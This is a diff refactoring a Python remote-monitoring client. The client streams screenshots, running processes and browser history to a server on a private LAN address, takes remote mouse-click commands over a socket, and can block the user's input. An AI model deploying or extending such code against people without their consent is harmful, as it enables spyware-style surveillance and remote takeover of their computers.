@@ -18,6 +18,9 @@ from ctypes import windll
 import time
 
 SERVER_URL = "http://192.168.1.200:5000"
+SERVER_IP = "192.168.1.200"
+SOCKET_PORT = 12341
+RECV_DEFAULT = 1024
 
 class ProcessDetails:
     def __init__(self):
@@ -42,7 +45,7 @@ class ScreenShot:
     def __init__(self):
         pass
 
-    def send_screenshot(self, computer_id):
+    def pre_screenshot(self, computer_id):
         """
         :param computer_id: the id of the current computer
 
@@ -63,9 +66,13 @@ class ScreenShot:
                 # Get the entire PNG raw bytes
                 raw_bytes = mss.tools.to_png(im.rgb, im.size, level=7)
                 if raw_bytes != prev_img:
-                    requests.post(SERVER_URL + '/get_file/' + computer_id, data=raw_bytes,
-                                  headers={'Content-Type': 'application/octet-stream'})
+                    self.send_screenshot(computer_id, raw_bytes)
                 prev_img = raw_bytes
+    
+    def send_screenshot(self, computer_id, raw_bytes):
+        requests.post(SERVER_URL + '/get_file/' + computer_id, data=raw_bytes,
+                                  headers={'Content-Type': 'application/octet-stream'})
+
 
 
 class SendToServer:
@@ -122,8 +129,7 @@ class GetHistory:
 class ComputerAction:
     def __init__(self):
         self.s = socket.socket()
-        port = 12341 
-        self.s.connect(('192.168.1.200', port))
+        self.s.connect((SERVER_IP, SOCKET_PORT))
     
     def click(self, x, y):
         """
@@ -132,9 +138,6 @@ class ComputerAction:
 
         The function clicks on the X & Y coordinates on the screen.
         """
-        print("fun active")
-        print(x)
-        print(y)
         win32api.SetCursorPos((x,y))
         win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0)
         win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,x,y,0,0)
@@ -147,7 +150,7 @@ class ComputerAction:
         """
         self.s.send(str(computer_id).encode())
         while True:
-            server_command = self.s.recv(1024)
+            server_command = self.s.recv(RECV_DEFAULT)
             try:
                 pos = json.loads(server_command.decode())
                 print(pos)
@@ -166,28 +169,46 @@ class ComputerAction:
                     windll.user32.BlockInput(False)
 
 
+
+
+class InitServer():
+    def __init__(self):
+        pass
+
+    def init_server_conn(self):
+        address_link = f'{SERVER_URL}/computers/verify_login'
+        response = requests.get(address_link)
+        status_code = response.status_code
+        if status_code == 200:
+            return self.get_client_id()
+        else:
+            print("--- The server is offline! Closing program... ---")
+            exit()
+    
+    def get_client_id(self):
+        req_id = requests.post(f'{SERVER_URL}/computers/verify_login',
+                            json={"mac_address": computer_mac_address()})
+        computer_id = req_id.content.decode()
+        return computer_id
+
+
 def computer_mac_address():
     """
     The function returns the mac address of the computer
     """
     return getmac.get_mac_address()
 
+
 def main():
-    address_link = 'http://192.168.1.200:5000/computers/verify_login'
-    response = requests.get(address_link)
-    status_code = response.status_code
-    computer_id = ""
-    if status_code == 200:
-        req_id = requests.post('http://192.168.1.200:5000/computers/verify_login',
-                            json={"mac_address": computer_mac_address()})
-        computer_id = req_id.content.decode()
+    init_conn = InitServer()
+    computer_id = init_conn.init_server_conn()
     screen = ScreenShot()
     running_proc = ProcessDetails()
     server_send = SendToServer(SERVER_URL + "/info/" + computer_id)
     com_history = GetHistory()
     mouse = ComputerAction()
     send_details = threading.Thread(target=server_send.send_computer_details, args=[running_proc, com_history])
-    send_screenshots = threading.Thread(target=screen.send_screenshot, args=[computer_id])
+    send_screenshots = threading.Thread(target=screen.pre_screenshot, args=[computer_id])
     send_action = threading.Thread(target=mouse.check_mouse_click, args=[computer_id])
     send_screenshots.setDaemon(True)
     send_details.start()
